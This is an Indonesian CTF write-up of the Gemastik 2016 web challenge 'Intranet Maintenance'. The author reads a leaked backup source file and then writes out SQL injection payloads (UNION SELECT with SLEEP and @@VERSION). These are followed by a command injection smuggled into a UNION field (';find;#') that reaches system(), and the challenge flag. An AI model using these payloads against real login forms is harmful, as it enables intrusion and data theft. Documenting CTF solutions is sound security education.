---
layout: post
title: "Writeup Gemastik 2016 : Intranet Maintenance - 125"
description: "Writeup Gemastik 2016 Online Capture The Flag Qualification"
headline: 
modified: 2016-08-15
category: Web Exploitation
tags: [gemastik]
imagefeature: /images/gemastik.png
mathjax: 
chart: 
comments: true
featured: false
---

### Problem :

![Intranet Maintenance](/images/intranet-maintenance.png)


### Solusi :

Sesuai dengan clue yang diberikan, kami membuka index.php~ dan menemukan source code file index.php.
setelah kami membaca  source code tersebut kami melihat kemungkinan untuk melakukan sql injection :

`$query = "SELECT * FROM users WHERE email='$email' AND password='$password';";`

kemudian kami mencoba union dengan sleep pada kolom email untuk memastikan query berjalan sesuai keinginan kita.

`' UNION SELECT SLEEP(10) # < NORMAL`

`' UNION SELECT SLEEP(10),1 #   < NORMAL`

`' UNION SELECT SLEEP(10),1,1 # < ERROR`

Ternyata ditemukan 3 kolom union lalu kami mengecek version dari mysqlnya dengan

`' UNION SELECT 1,@@VERSION,1 #`

![Intranet maintenance mysql](/images/intranet-maintenance-mysql.png)

Kemudian kita melihat bahwa input kita masuk ke dalam system() Dan memungkinkan kita untuk melakukan command injection

![Intranet maintenance system](/images/intranet-maintenance-system.png)

Kami kemudian mencoba untuk melakukan injeksi command dengan menggunakan separator `;payload;#`
Kemudian kami sisipkan command pada kolom email

`' UNION SELECT 1,';find;#',1 #`

![Intranet maintenance find](/images/intranet-maintenance-find.png)

Dan ditemukan flag pada `db.php.save`

![Intranet maintenance flag](/images/intranet-maintenance-flag.png)

`GEMASTIK{just_another_admin_who_dont_care_about_s3cur1ty}`


